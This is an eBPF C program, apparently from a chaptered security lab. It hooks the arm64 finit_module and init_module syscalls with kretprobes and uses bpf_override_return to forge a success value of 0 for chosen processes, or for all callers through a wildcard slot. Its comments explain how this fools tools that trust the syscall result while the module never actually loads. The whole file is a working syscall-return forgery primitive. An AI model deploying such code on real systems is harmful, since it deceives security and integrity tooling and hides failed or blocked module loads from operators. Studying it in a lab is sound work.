// Ch12 Signed-Driver Swap (syscall variant) — forge module-load syscall
// returns to 0 for target tgids by attaching kretprobes to the module-load
// syscall entry points. On 6.12 aarch64 linuxkit, __arm64_sys_finit_module
// and __arm64_sys_init_module are both listed in
// /sys/kernel/debug/error_injection/list, so bpf_override_return(ctx, 0)
// is permitted here.
//
// This is an *illusion* bypass: the kernel still rejects the malformed
// .ko inside the loader (ELF validation, signature check, etc.) — we only
// rewrite the userspace-visible return value. `lsmod` will NOT show the
// module because nothing was actually loaded. Any tool that trusts the
// syscall return to mean "module is loaded" is fooled; any tool that
// verifies by consulting /proc/modules is not.
//
// Same primitive class as ch14/ch18: syscall-return forgery on the
// kernel error-injection allowlist.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "GPL";

#define HOOK_FINIT_MODULE 1
#define HOOK_INIT_MODULE  2

struct evt {
    unsigned int pid;
    unsigned int tgid;
    char         comm[16];
    long         orig_ret;
    int          hook;
    int          flipped;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

// tgid -> 1.  Key 0 is the wildcard slot ("forge every caller").
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1024);
} target_tgids SEC(".maps");

static __always_inline int is_target(void)
{
    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    if (bpf_map_lookup_elem(&target_tgids, &tgid))
        return 1;
    unsigned int zero = 0;
    if (bpf_map_lookup_elem(&target_tgids, &zero))
        return 1;
    return 0;
}

static __always_inline void emit(long ret, int hook, int flipped)
{
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return;
    unsigned long long id = bpf_get_current_pid_tgid();
    e->pid = (unsigned int)(id & 0xffffffff);
    e->tgid = (unsigned int)(id >> 32);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    e->orig_ret = ret;
    e->hook = hook;
    e->flipped = flipped;
    bpf_ringbuf_submit(e, 0);
}

SEC("kretprobe/__arm64_sys_finit_module")
int BPF_KRETPROBE(kr_finit_module, long ret)
{
    int flip = 0;
    if (is_target() && ret != 0) {
        bpf_override_return(ctx, 0);
        flip = 1;
    }
    emit(ret, HOOK_FINIT_MODULE, flip);
    return 0;
}

SEC("kretprobe/__arm64_sys_init_module")
int BPF_KRETPROBE(kr_init_module, long ret)
{
    int flip = 0;
    if (is_target() && ret != 0) {
        bpf_override_return(ctx, 0);
        flip = 1;
    }
    emit(ret, HOOK_INIT_MODULE, flip);
    return 0;
}
